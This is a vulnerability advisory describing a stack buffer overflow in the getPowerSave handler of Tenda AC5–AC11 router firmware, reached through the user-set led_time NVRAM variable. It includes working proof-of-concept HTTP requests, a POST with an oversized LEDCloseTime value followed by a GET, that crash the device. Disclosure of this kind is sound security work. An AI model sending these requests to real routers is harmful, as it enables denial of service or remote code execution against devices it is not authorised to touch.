# Tenda Router Vulnerability

This vulnerability exists in  module `LEDControl` of  `/goform/getPowerSave`  and affects multiple devices of the Tenda Router. Equipment models include AC5, AC6, AC7, AC8, AC10, AC11. It affects several firmware versions, including the latest version number published on the official website. And it is RTOS system.

[https://www.tenda.com.cn/searchdown/AC.html](https://www.tenda.com.cn/searchdown/AC.html)

## Vulnerability description

（The pseudocode for the example is the last version of AC6）

![pic/Untitled.png](pic/Untitled.png)

There is a stack buffer overflow vulnerability in the `sub_8008697C` function.(page  /goform/getPowerSave)

In this function, it will use `nvram_get((int)"led_time");` to  gets an NVRAM variable, which is then placed in a `V5` variable. After that ,it will use `Strcpy (v8, v5);`  to copy the `V5` on the `V8` without any security checks.

The  `led_time`  NVRAM variable can be controlled in the `sub_8008681C` function.

![pic/Untitled1.png](pic/Untitled%201.png)

You can see that it's assigned by `v10`.

![pic/Untitled2.png](pic/Untitled%202.png)

Initially `v10` is what we inputed, so the `led_time` NVRAM variable becomes manageable.

Thus, by first setting the `led_time` on the page `/goform/setPowerSave` and then requesting the page `/goform/getPowerSave`, an attacker can easily perform a denial-of-service attack or remote code execution using crafted overflow data.

## POC

```
POST /goform/setPowerSave HTTP/1.1
Host: 192.168.0.1
Content-Length: 188
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Accept: */*
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

module1=LEDControl&LEDStatus=2&LEDCloseTime=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

```
GET /goform/getPowerSave?random=0.7312766635668926&modules=LEDControl HTTP/1.1
Host: 192.168.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

### Verify

Vulnerability demo

![pic/Untitled3.png](pic/Untitled%203.png)

![pic/Untitled4.png](pic/Untitled%204.png)

If the number of characters were longer, it would be enough to overflow.